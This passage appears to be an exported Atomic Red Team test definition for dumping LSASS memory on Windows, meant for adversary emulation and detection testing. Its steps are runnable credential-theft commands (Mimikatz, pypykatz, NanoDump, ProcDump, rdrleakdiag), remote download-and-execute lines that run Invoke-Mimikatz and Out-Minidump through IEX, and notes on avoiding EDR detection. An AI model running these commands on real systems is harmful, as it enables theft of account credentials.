                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved using direct system calls and API unhooking in an effort to avoid detection. \nhttps://github.com/outflanknl/Dumpert\nhttps://outflank.nl/blog/2019/06/19/red-team-tactics-combining-direct-system-calls-and-srdi-to-bypass-av-edr/\nUpon successful execution, you should see the following file created C:\\\\windows\\\\temp\\\\dumpert.dmp.\n\nIf you see a message saying \\\"The system cannot find the path specified.\\\", try using the  get-prereq_commands to download the  tool first.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "dumpert_exe": {
                                "description": "Path of Dumpert executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\Outflank-Dumpert.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Dumpert executable must exist on disk at specified location (#{dumpert_exe})\n",
                                "prereq_command": "if (Test-Path \"#{dumpert_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory (Split-Path \"#{dumpert_exe}\") -Force | Out-Null\nInvoke-WebRequest \"https://github.com/clr2of8/Dumpert/raw/5838c357224cc9bc69618c80c2b5b2d17a394b10/Dumpert/x64/Release/Outflank-Dumpert.exe\" -OutFile \"#{dumpert_exe}\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{dumpert_exe}\"\n",
                            "cleanup_command": "del C:\\windows\\temp\\dumpert.dmp >nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory using NanoDump",
                        "auto_generated_guid": "dddd4aca-bbed-46f0-984d-e4c5971c51ea",
                        "description": "The NanoDump tool uses syscalls and an invalid dump signature to avoid detection.\n\nhttps://github.com/helpsystems/nanodump\n\nUpon successful execution, you should find the nanondump.dmp file in the temp directory\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
                                "prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\" \n"
                            }
                        ],
                        "executor": {
                            "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe -w \"%temp%\\nanodump.dmp\"\n",
                            "cleanup_command": "del \"%temp%\\nanodump.dmp\" >nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory using Windows Task Manager",
                        "auto_generated_guid": "dea6c349-f1c6-44f3-87a1-1ed33a59a607",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with the Windows Task\nManager and administrative permissions.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "steps": "1. Open Task Manager:\n  On a Windows system this can be accomplished by pressing CTRL-ALT-DEL and selecting Task Manager or by right-clicking\n  on the task bar and selecting \"Task Manager\".\n\n2. Select lsass.exe:\n  If lsass.exe is not visible, select \"Show processes from all users\". This will allow you to observe execution of lsass.exe\n  and select it for manipulation.\n\n3. Dump lsass.exe memory:\n  Right-click on lsass.exe in Task Manager. Select \"Create Dump File\". The following dialog will show you the path to the saved file.\n",
                            "name": "manual"
                        }
                    },
                    {
                        "name": "Offline Credential Theft With Mimikatz",
                        "auto_generated_guid": "453acf13-1dbd-47d7-b28a-172ce9228023",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. Adversaries commonly perform this offline analysis with\nMimikatz. This tool is available at https://github.com/gentilkiwi/mimikatz and can be obtained using the get-prereq_commands.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "input_file": {
                                "description": "Path of the Lsass dump",
                                "type": "path",
                                "default": "%tmp%\\lsass.DMP"
                            },
                            "mimikatz_exe": {
                                "description": "Path of the Mimikatz binary",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\mimikatz.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Mimikatz must exist on disk at specified location (#{mimikatz_exe})\n",
                                "prereq_command": "if (Test-Path \"#{mimikatz_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (iwr \"https://raw.githubusercontent.com/redcanaryco/invoke-atomicredteam/master/Public/Invoke-FetchFromZip.ps1\" -UseBasicParsing) \n$releases = \"https://api.github.com/repos/gentilkiwi/mimikatz/releases\"\n$zipUrl = (Invoke-WebRequest $releases | ConvertFrom-Json)[0].assets.browser_download_url | where-object { $_.endswith(\".zip\") }\n$basePath = Split-Path \"#{mimikatz_exe}\" | Split-Path\nInvoke-FetchFromZip $zipUrl \"x64/mimikatz.exe\" $basePath\n"
                            },
                            {
                                "description": "Lsass dump must exist at specified location (#{input_file})\n",
                                "prereq_command": "cmd /c \"if not exist #{input_file} (exit /b 1)\"\n",
                                "get_prereq_command": "Write-Host \"Create the lsass dump manually using the steps in the previous test (Dump LSASS.exe Memory using Windows Task Manager)\"\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{mimikatz_exe}\" \"sekurlsa::minidump #{input_file}\" \"sekurlsa::logonpasswords full\" exit\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "LSASS read with pypykatz",
                        "auto_generated_guid": "c37bc535-5c62-4195-9cc3-0517673171d8",
                        "description": "Parses secrets hidden in the LSASS process with python. Similar to mimikatz's sekurlsa::\n\nPython 3 must be installed, use the get_prereq_command's to meet the prerequisites for this test.\n\nSuccessful execution of this test will display multiple usernames and passwords/hashes to the screen.\n\nWill create a Python virtual environment within the External Payloads folder that can be deleted manually post test execution.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "venv_path": {
                                "description": "Path to the folder for the tactics venv",
                                "type": "string",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\venv_t1003_001"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "Computer must have python 3 installed\n",
                                "prereq_command": "if (Get-Command py -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction ignore -Force | Out-Null\ninvoke-webrequest \"https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe\" -outfile \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\"\nStart-Process -FilePath \"PathToAtomicsFolder\\..\\ExternalPayloads\\python_setup.exe\" -ArgumentList \"/quiet InstallAllUsers=1 PrependPath=1 Include_test=0\" -Wait\n"
                            },
                            {
                                "description": "Computer must have venv configured at #{venv_path}\n",
                                "prereq_command": "if (Test-Path -Path \"#{venv_path}\") { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "py -m venv \"#{venv_path}\"\n"
                            },
                            {
                                "description": "pypykatz must be installed \n",
                                "prereq_command": "if (Get-Command \"#{venv_path}\\Scripts\\pypykatz\" -errorAction SilentlyContinue) { exit 0 } else { exit 1 }\n",
                                "get_prereq_command": "& \"#{venv_path}\\Scripts\\pip.exe\" install --no-cache-dir pypykatz 2>&1 | Out-Null\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{venv_path}\\Scripts\\pypykatz\" live lsa \n",
                            "cleanup_command": "del \"%temp%\\nanodump.dmp\" > nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory using Out-Minidump.ps1",
                        "auto_generated_guid": "6502c8f0-b775-4dbd-9193-1298f56b6781",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This test leverages a pure\npowershell implementation that leverages the MiniDumpWriteDump Win32 API call.\nUpon successful execution, you should see the following file created $env:TEMP\\lsass_*.dmp.\n\nAuthor of Out-Minidump: Matthew Graeber (@mattifestation)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\nget-process lsass | Out-Minidump\n",
                            "cleanup_command": "Remove-Item $env:TEMP\\lsass_*.dmp -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Create Mini Dump of LSASS.exe using ProcDump",
                        "auto_generated_guid": "7cede33f-0acd-44ef-9774-15511300b24b",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved with Sysinternals\nProcDump. This particular method uses -mm to produce a mini dump of lsass.exe\n\nUpon successful execution, you should see the following file created c:\\windows\\temp\\lsass_dump.dmp.\n\nIf you see a message saying \"procdump.exe is not recognized as an internal or external command\", try using the  get-prereq_commands to download and install the ProcDump tool first.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "output_file": {
                                "description": "Path where resulting dump should be placed",
                                "type": "path",
                                "default": "C:\\Windows\\Temp\\lsass_dump.dmp"
                            },
                            "procdump_exe": {
                                "description": "Path of Procdump executable",
                                "type": "path",
                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\procdump.exe"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "ProcDump tool from Sysinternals must exist on disk at specified location (#{procdump_exe})\n",
                                "prereq_command": "if (Test-Path \"#{procdump_exe}\") {exit 0} else {exit 1}\n",
                                "get_prereq_command": "New-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://download.sysinternals.com/files/Procdump.zip\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\"\nExpand-Archive \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump.zip\" \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\" -Force\nNew-Item -ItemType Directory (Split-Path \"#{procdump_exe}\") -Force | Out-Null\nCopy-Item \"PathToAtomicsFolder\\..\\ExternalPayloads\\Procdump\\Procdump.exe\" \"#{procdump_exe}\" -Force\n"
                            }
                        ],
                        "executor": {
                            "command": "\"#{procdump_exe}\" -accepteula -mm lsass.exe #{output_file}\n",
                            "cleanup_command": "del \"#{output_file}\" >nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Powershell Mimikatz",
                        "auto_generated_guid": "66fb0bc1-3c3f-47e9-a298-550ecfefacbc",
                        "description": "Dumps credentials from memory via Powershell by invoking a remote mimikatz script.\nIf Mimikatz runs successfully you will see several usernames and hashes output to the screen.\nCommon failures include seeing an \\\"access denied\\\" error which results when Anti-Virus blocks execution. \nOr, if you try to run the test without the required administrative privileges you will see this error near the bottom of the output to the screen \"ERROR kuhl_m_sekurlsa_acquireLSA\"\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "remote_script": {
                                "description": "URL to a remote Mimikatz script that dumps credentials",
                                "type": "url",
                                "default": "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f650520c4b1004daf8b3ec08007a0b945b91253a/Exfiltration/Invoke-Mimikatz.ps1"
                            }
                        },
                        "executor": {
                            "command": "IEX (New-Object Net.WebClient).DownloadString('#{remote_script}'); Invoke-Mimikatz -DumpCreds\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS with createdump.exe from .Net v5",
                        "auto_generated_guid": "9d0072c8-7cca-45c4-bd14-f852cfa35cf0",
                        "description": "Use createdump executable from .NET to create an LSASS dump.\n\n[Reference](https://twitter.com/bopin2020/status/1366400799199272960?s=20)\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": ".Net v5 must be installed\n",
                                "prereq_command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\nif ($exePath -and (Test-Path $exePath)) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "winget install Microsoft.DotNet.DesktopRuntime.5 --accept-source-agreements --accept-package-agreements --silent\n"
                            }
                        ],
                        "executor": {
                            "command": "$exePath =  resolve-path \"$env:ProgramFiles\\dotnet\\shared\\Microsoft.NETCore.App\\5*\\createdump.exe\"\n& \"$exePath\" -u -f $env:Temp\\dotnet-lsass.dmp (Get-Process lsass).id\n",
                            "cleanup_command": "Remove-Item $env:Temp\\dotnet-lsass.dmp -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe using imported Microsoft DLLs",
                        "auto_generated_guid": "86fc3f40-237f-4701-b155-81c01c48d697",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. This can be achieved by\nimporting built-in DLLs and calling exported functions. Xordump will re-read the resulting minidump \nfile and delete it immediately to avoid brittle EDR detections that signature lsass minidump files.\n\nUpon successful execution, you should see the following file created $env:TEMP\\lsass-xordump.t1003.001.dmp.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "xordump_exe": {
                                "description": "Path to xordump",
                                "type": "path",
                                "default": "C:\\Windows\\Temp\\xordump.exe"
                            },
                            "output_file": {
                                "description": "Path where resulting dump should be placed",
                                "type": "path",
                                "default": "C:\\Windows\\Temp\\lsass-xordump.t1003.001.dmp"
                            }
                        },
                        "dependencies": [
                            {
                                "description": "Computer must have xordump.exe\n",
                                "prereq_command": "if (Test-Path '#{xordump_exe}') {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nInvoke-WebRequest \"https://github.com/audibleblink/xordump/releases/download/v0.0.1/xordump.exe\" -OutFile #{xordump_exe}\n"
                            }
                        ],
                        "executor": {
                            "command": "#{xordump_exe} -out #{output_file} -x 0x41\n",
                            "cleanup_command": "Remove-Item #{output_file} -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe using lolbin rdrleakdiag.exe",
                        "auto_generated_guid": "47a539d1-61b9-4364-bf49-a68bc2a95ef0",
                        "description": "The memory of lsass.exe is often dumped for offline credential theft attacks. \nThis can be achieved with lolbin rdrleakdiag.exe. \n\nUpon successful execution, you should see the following files created, $env:TEMP\\minidump_<PID>.dmp and  $env:TEMP\\results_<PID>.hlk.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "executor": {
                            "command": "if (Test-Path -Path \"$env:SystemRoot\\System32\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\System32\\rdrleakdiag.exe\"\n  } elseif (Test-Path -Path \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\") {\n      $binary_path = \"$env:SystemRoot\\SysWOW64\\rdrleakdiag.exe\"\n  } else {\n      $binary_path = \"File not found\"\n      exit 1\n  }\n$lsass_pid = get-process lsass |select -expand id\nif (-not (Test-Path -Path\"$env:TEMP\\t1003.001-13-rdrleakdiag\")) {New-Item -ItemType Directory -Path $env:TEMP\\t1003.001-13-rdrleakdiag -Force} \nwrite-host $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\n& $binary_path /p $lsass_pid /o $env:TEMP\\t1003.001-13-rdrleakdiag /fullmemdmp /wait 1\nWrite-Host \"Minidump file, minidump_$lsass_pid.dmp can be found inside $env:TEMP\\t1003.001-13-rdrleakdiag directory.\"\n",
                            "cleanup_command": "Remove-Item $env:TEMP\\t1003.001-13-rdrleakdiag -Recurse -Force -ErrorAction Ignore\n",
                            "name": "powershell",
                            "elevation_required": true
                        }
                    },
                    {
                        "name": "Dump LSASS.exe Memory through Silent Process Exit",
                        "auto_generated_guid": "eb5adf16-b601-4926-bca7-dad22adffb37",
                        "description": "WerFault.exe (Windows Error Reporting process that handles process crashes) can be abused to create a \nmemory dump of lsass.exe, in a directory of your choice. This method relies on a mechanism \nintroduced in Windows 7 called Silent Process Exit, which provides the ability to trigger\nspecific actions for a monitored process in one of two scenarios; either the process terminates\nitself by calling ExitProcess(), or another process terminates it via the TerminateProcess() API. \nThe major advantage of this technique is that it does not cause lsass.exe to crash, and since \nWerFault.exe is used to create file dumps all the time (not just lsass.exe), this method provides \nthe added advantage of going undetected. WerFault.exe is a process known for dumping every crashing process, \nfrom an attacker standpoint this is appealing as their illicit credential extraction will \nappear benign because from a defender’s viewpoint it’s within the realm of normal activity.\n\nUpon successful execution, you should find the dump file in directory of your choice or \"%temp%\\SilentProcessExit\" by default.\n",
                        "supported_platforms": [
                            "windows"
                        ],
                        "input_arguments": {
                            "output_folder": {
                                "description": "Folder Path where resulting dump should be placed",
                                "type": "path",
                                "default": "%temp%\\SilentProcessExit"
                            }
                        },
                        "dependency_executor_name": "powershell",
                        "dependencies": [
                            {
                                "description": "NanoDump executable must exist on disk at specified location (PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe)\n",
                                "prereq_command": "if (Test-Path PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe) {exit 0} else {exit 1}\n",
                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -Type Directory \"PathToAtomicsFolder\\..\\ExternalPayloads\\\" -ErrorAction Ignore -Force | Out-Null\nInvoke-WebRequest \"https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe\" -OutFile \"PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe\"\n"
                            }
                        ],
                        "executor": {
                            "command": "PathToAtomicsFolder\\..\\ExternalPayloads\\nanodump.x64.exe --silent-process-exit \"#{output_folder}\"\n",
                            "cleanup_command": "rmdir \"#{output_folder}\" /s /q >nul 2> nul\n",
                            "name": "command_prompt",
                            "elevation_required": true
                        }
                    }
                ]
            }
        ]
    },
    "timestamp": "2025-02-28 10:37:09"
}